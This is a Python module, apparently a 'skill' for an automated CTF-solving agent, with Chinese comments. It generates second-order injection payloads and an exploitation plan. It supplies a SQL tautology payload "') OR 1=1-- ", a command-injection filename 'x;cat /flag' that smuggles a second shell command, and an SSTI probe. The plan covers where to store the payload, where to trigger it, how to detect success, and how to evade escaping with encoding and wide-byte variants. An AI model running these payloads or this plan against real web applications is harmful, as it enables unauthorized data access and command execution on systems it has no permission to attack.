"""web_second_order_injection skill：二次注入利用模板。

场景（正式赛 web 升级方向）：
1. 二次 SQL 注入：存储时参数化/转义（入库），触发点拼接时未转义 → 触发
2. 二次命令注入：存储恶意文件名/用户名，后续命令拼接未转义
3. 二次 SSTI：存储模板片段，渲染时拼接执行

关键识别：找到「存储点 + 触发点」的分离结构——存储时看似安全（转义），
但触发点二次拼接绕过。

用法（skill 调用）：
    params = {'store_url': ..., 'trigger_url': ..., 'payload_type': 'sql|cmd|ssti',
              'payload': 恶意载荷}
"""


def build_sql_payload(prefix: str = "')") -> str:
    """二次 SQL 注入 payload：存储时被转义入库，触发时闭合引号。"""
    return f"{prefix} OR 1=1-- "


def build_cmd_payload(name: str = "x;cat /flag") -> str:
    """二次命令注入 payload：存储恶意文件名，触发命令拼接时执行。"""
    return name


def build_ssti_payload(tpl: str = "{{7*7}}") -> str:
    """二次 SSTI payload：存储模板片段，渲染时执行。"""
    return tpl


def web_second_order_injection(params: dict) -> dict:
    """skill 入口：返回二次注入利用计划。"""
    ptype = params.get("payload_type", "sql")
    store_url = params.get("store_url", "")
    trigger_url = params.get("trigger_url", "")
    payload = params.get("payload", "")

    if ptype == "sql":
        payload = payload or build_sql_payload()
        detect = "触发点响应含 'OR 1=1' 生效特征（多行返回/时间差）"
    elif ptype == "cmd":
        payload = payload or build_cmd_payload()
        detect = "触发点执行命令输出回显 / 盲延时"
    else:
        payload = payload or build_ssti_payload()
        detect = "触发点渲染 `{{7*7}}` → 49"

    return {
        "ok": True,
        "payload_type": ptype,
        "payload": payload,
        "store_url": store_url,
        "trigger_url": trigger_url,
        "plan": [
            f"1. 在存储点 {store_url or '?'} 提交 payload（观察是否被转义——这是关键："
            "二次注入要求存储时安全、触发时危险）",
            f"2. 在触发点 {trigger_url or '?'} 触发（搜索/导出/拼接场景）",
            f"3. 检测：{detect}",
            "4. 若存储点转义了引号，尝试编码/宽字节/注释符变体",
        ],
    }


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return web_second_order_injection(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="web 二次注入模板")
    parser.add_argument("--type", default="sql", help="sql|cmd|ssti")
    args = parser.parse_args()
    import json

    print(json.dumps(web_second_order_injection({"payload_type": args.type}),
                     ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
